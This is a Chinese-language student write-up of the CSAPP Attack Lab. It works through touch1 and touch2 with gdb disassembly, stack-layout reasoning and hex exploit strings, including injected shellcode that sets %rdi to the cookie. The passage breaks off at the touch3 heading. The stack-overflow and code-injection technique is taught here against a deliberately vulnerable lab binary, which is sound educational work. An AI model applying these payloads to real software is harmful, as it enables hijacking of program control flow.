1. touch1()

ctarget的流程如下：

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

其中：

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

需要通过代码注入攻击使得 getbuf() 运行结束后返回到 touch1() 函数：

```C
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

利用`gdb` 调试`ctarget`找到我们需要的信息

```
gdb ctarget
```

首先反汇编test():

```
(gdb)  disas test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:		sub    $0x8,%rsp
   0x000000000040196c <+4>:		mov    $0x0,%eax
   0x0000000000401971 <+9>:		callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq  
```

然后反汇编getbuf():

```
(gdb) > disas getbuf
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
```

也就是说，当getbuf函数运行到retq这个语句时，应该让它返回至touch1()的地址，首先理解retq这个语句的含义：

![image-20210506213903895](/home/lalawang/.config/Typora/typora-user-images/image-20210506213903895.png)

函数在跳转前会将返回的地址压到栈顶，返回前会先将栈顶保存的地址弹出再跳转。因此，找到getbuf()函数存放返回地址的栈上的那个内存单元改变里面的值即可。



在getbuf的首句打上断点并运行：

```
(gdb) b *0x4017a8
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

(gdb) run -q
Starting program: /mnt/projects/CSAPP-Assignments/my-solution/3-Attack-Lab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12	buf.c: No such file or directory.
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:		sub    $0x28,%rsp
   0x00000000004017ac <+4>:		mov    %rsp,%rdi
   0x00000000004017af <+7>:		callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```

此时执行到 ==> 处， 此时查看rsp指向内存所存储的值：

```
(gdb) print /x *(int*) $rsp
$1 = 0x401976
```

而0x401976是test()函数中执行完getbuf()下一个语句的地址，因此通过代码注入将这个位置的内容改成touch1()的地址。



从第一行`sub $0x28, %rsp`中显示，在栈上为`buf`提供了0x28也就是40个字节的空间,反汇编`touch1`函数，找到`touch1`函数的起始地址:

```
(gdb)> disas touch1
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
```

从第一行中看出，`touch1`的返回地址是`0x00000000004017c0`

输入字符，首先填充栈，可以使用任意字符，这里我使用的是16进制的0x00填充，然后填充`touch1`地址，最后得到是如下结果：

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

大部分电脑应该都是`little-endian`字节序，即低位在低地址，高位在高地址。

![image-20210507101128729](/home/lalawang/.config/Typora/typora-user-images/image-20210507101128729.png)

```
> ./hex2raw -i solutions/level1.txt | ./ctarget -q
```

![image-20210506212326205](/home/lalawang/.config/Typora/typora-user-images/image-20210506212326205.png)



2. touch2()

touch2()地址：0x00000000004017ec

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:		sub    $0x8,%rsp
   0x00000000004017f0 <+4>:		mov    %edi,%edx
   0x00000000004017f2 <+6>:		movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	callq  0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	callq  0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```

为了完成让getbuf()执行结束后跳转至touch2()，并且传递相应参数。那么在ret跳转至touch2()之前，需要将参数寄存器%rdi中存储的内容改成cookie字符串，而这需要若干汇编指令来实现，也就是说，我们需要让getbuf()的retq跳到自己写的代码指令中去，再让自己的代码跳回touch2()里：

首先确定自己需要注入的代码， vim task2code.s：

```
pushq $0x59b997fa   
pop %rdi
push $0x4017ec
retq
```

其中，0x59b997fa是实验的cookie，压入栈上后pop至%rdi寄存器，0x4017ec是touch2()函数的地址，压入栈顶，retq会先将栈顶元素弹出至%rip寄存器后然后执行。

对这一段代码汇编后objdump查看机器指令：

```
➜  vim task2code.s
➜  target1 git:(master) ✗ gcc -c task2code.s 
➜  objdump -d task2code.o > task2code.d
cat task2code.d

task2code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 fa 97 b9 59       	pushq  $0x59b997fa
   5:	5f                   	pop    %rdi
   6:	68 ec 17 40 00       	pushq  $0x4017ec
   b:	c3                   	retq 
```

可以得到这一段汇编代码对应的机器指令序列为：

```
68 fa 97 b9 59 5f 68 ec 17 40 00 c3
```

那么接下来就只需要思考将这段代码放在哪里：

在getbuf中运行期间，栈结构如下图所示：

![image-20210507114020706](/home/lalawang/.config/Typora/typora-user-images/image-20210507114020706.png)

上图中，我们把自己注入的代码放到0x5561dc78中，那么在0x5561dca0处所存储的指就是0x5561dc78，这样getbuf()中retq语句执行后，我们自己的代码指令会被加载进%rip中开始执行，因此输入的字符串：

```
68 fa 97 b9 59 5f 68 ec
17 40 00 c3 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

或者（将自己的机器指令放到0x5561dca0的更高位地址也可）：

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
a8 dc 61 55 00 00 00 00
68 fa 97 b9 59 5f 68 ec
17 40 00 c3 00 00 00 00
```

3. touch3()